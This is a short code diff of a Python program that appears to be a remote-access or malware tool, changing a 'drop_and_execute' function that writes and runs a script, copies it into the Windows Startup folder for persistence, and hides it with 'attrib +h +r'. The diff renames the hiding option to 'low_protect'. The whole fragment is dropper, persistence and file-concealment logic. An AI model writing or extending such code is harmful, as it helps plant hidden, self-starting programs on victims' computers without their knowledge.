@@ -68,7 +68,7 @@ class Socket:
             self.established = False
 
 
-def drop_and_execute(script, execute_file=False, startup=False, hide_file=False):
+def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
     if not script:
         return
     # Format script
@@ -95,9 +95,9 @@ def drop_and_execute(script, execute_file=False, startup=False, hide_file=False)
         startfile(path)
 
     # Hide File by calling Windows command
-    if hide_file:
+    if low_protect:
         chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
-        system("attrib +h " + file_name)
+        system("attrib +h +r " + file_name)
 
 
 def copy_to_startup(file_name):
